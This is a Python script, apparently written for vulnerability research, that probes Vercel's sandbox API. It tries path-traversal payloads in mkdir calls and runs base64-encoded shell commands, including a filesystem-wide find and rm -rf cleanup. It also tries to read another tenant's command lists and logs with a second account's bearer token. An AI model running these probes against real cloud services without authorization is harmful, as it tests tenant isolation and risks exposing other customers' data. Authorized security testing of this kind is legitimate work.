# -*- coding: utf-8 -*-
"""v51d: mkdir 相对路径解析位置验证 + v3 snapshot/fork + cmd 列表/logs 跨租户"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')

def api_raw(method, path, body=None, tok=None, timeout=180, maxlen=200000, xcwd=None):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + (tok or TOKEN))
    req.add_header('Content-Type', 'application/json')
    if xcwd:
        req.add_header('x-cwd', xcwd)
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:maxlen]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:maxlen]
    except Exception as e:
        return -1, 'EXC %s' % str(e)[:120]

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

if __name__ == '__main__':
    # 1. mkdir 转义位置验证
    print('=== M1: mkdir ../ 位置 ===', flush=True)
    api_raw('DELETE', '/v2/sandboxes/mkesc51?teamId=%s&projectId=%s' % (TEAM, PROJ))
    time.sleep(2)
    c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": 'mkesc51'})
    if c != 200:
        sys.exit(1)
    sid = json.loads(r)['sandbox']['currentSessionId']
    print('sid =', sid, flush=True)
    time.sleep(8)
    # 相对路径 (不传 x-cwd, 默认 cwd)
    for p in ['../mk_esc', 'a/../../mk_esc2', '/tmp/../mk_esc3']:
        c2, r2 = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/mkdir?teamId=%s' % (sid, TEAM), {"path": p})
        print('[mkdir %s] -> %d %s' % (p, c2, (r2 or '')[:80]), flush=True)
        time.sleep(1)
    # 带 x-cwd 的相对路径
    c2, r2 = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/mkdir?teamId=%s' % (sid, TEAM),
                     {"path": '../mk_esc4'}, xcwd='/tmp')
    print('[mkdir ../ with cwd] -> %d %s' % (c2, (r2 or '')[:80]), flush=True)
    # 全盘搜索 mk_esc* 位置
    b64 = base64.b64encode(b'find / -name "mk_esc*" -maxdepth 4 2>/dev/null; echo ---; pwd; echo ---; ls -la /mk_esc /mk_esc2 /mk_esc3 /vercel/mk_esc4 /mk_esc4 2>&1 | head -20').decode()
    c3, r3 = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
                     {"command": "sh", "args": ["-c", 'echo %s | base64 -d | sh' % b64],
                      "wait": True, "logs": True, "timeout": 20000}, timeout=60)
    print('[find mk_esc] -> %d\n%s' % (c3, parse_data(r3).strip()[:400]), flush=True)
    # 清理
    api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
            {"command": "sh", "args": ["-c", 'rm -rf /mk_esc /mk_esc2 /mk_esc3 /mk_esc4 /vercel/mk_esc4 /tmp/mk_esc3'],
             "wait": True, "timeout": 15000}, timeout=60)
    api_raw('DELETE', '/v2/sandboxes/mkesc51?teamId=%s&projectId=%s' % (TEAM, PROJ))

    # 2. v3 snapshot + fork
    print('=== V1: v3 snapshot/fork ===', flush=True)
    api_raw('DELETE', '/v2/sandboxes/v3s51?teamId=%s&projectId=%s' % (TEAM, PROJ))
    time.sleep(2)
    c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": 'v3s51'})
    if c == 200:
        sid = json.loads(r)['sandbox']['currentSessionId']
        time.sleep(8)
        c2, r2 = api_raw('POST', '/v3/sandboxes/sessions/%s/snapshot?teamId=%s' % (sid, TEAM), {})
        print('[v3 snapshot] -> %d %s' % (c2, (r2 or '')[:150]), flush=True)
        c3, r3 = api_raw('POST', '/v3/sandboxes/%s/fork?teamId=%s&projectId=%s' % ('v3s51', TEAM, PROJ),
                         {"name": 'v3s51f'}, timeout=120)
        print('[v3 fork] -> %d %s' % (c3, (r3 or '')[:150]), flush=True)
        api_raw('DELETE', '/v2/sandboxes/v3s51f?teamId=%s&projectId=%s' % (TEAM, PROJ))
    api_raw('DELETE', '/v2/sandboxes/v3s51?teamId=%s&projectId=%s' % (TEAM, PROJ))

    # 3. cmd 列表/logs 跨租户
    print('=== C1: GET cmd 列表 + logs ===', flush=True)
    api_raw('DELETE', '/v2/sandboxes/cmdlist51?teamId=%s&projectId=%s' % (TEAM, PROJ))
    time.sleep(2)
    c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": 'cmdlist51'})
    if c == 200:
        sid = json.loads(r)['sandbox']['currentSessionId']
        time.sleep(8)
        # 先执行一个命令拿 cmdId
        b64 = base64.b64encode(b'echo SECRET_CMD_OUTPUT_99').decode()
        c2, r2 = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
                         {"command": "sh", "args": ["-c", 'echo %s | base64 -d | sh' % b64],
                          "wait": True, "logs": True, "timeout": 15000}, timeout=60)
        cmd_id = None
        try:
            cmd_id = json.loads(r2)['command']['id']
        except Exception:
            pass
        print('[cmd exec] -> %d cmd_id=%s' % (c2, cmd_id), flush=True)
        time.sleep(2)
        c3, r3 = api_raw('GET', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM))
        print('[list cmds own] -> %d %s' % (c3, (r3 or '')[:300]), flush=True)
        if cmd_id:
            c4, r4 = api_raw('GET', '/v2/sandboxes/sessions/%s/cmd/%s/logs?teamId=%s' % (sid, cmd_id, TEAM))
            print('[cmd logs own] -> %d %s' % (c4, (r4 or '')[:300]), flush=True)
        # 跨租户: victim 读 attacker 的 cmd 列表/logs
        c5, r5 = api_raw('GET', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM_V), tok=TOK_V)
        print('[list cmds victim] -> %d %s' % (c5, (r5 or '')[:150]), flush=True)
        if cmd_id:
            c6, r6 = api_raw('GET', '/v2/sandboxes/sessions/%s/cmd/%s/logs?teamId=%s' % (sid, cmd_id, TEAM_V), tok=TOK_V)
            print('[cmd logs victim] -> %d %s' % (c6, (r6 or '')[:150]), flush=True)
    api_raw('DELETE', '/v2/sandboxes/cmdlist51?teamId=%s&projectId=%s' % (TEAM, PROJ))
    print('DONE', flush=True)
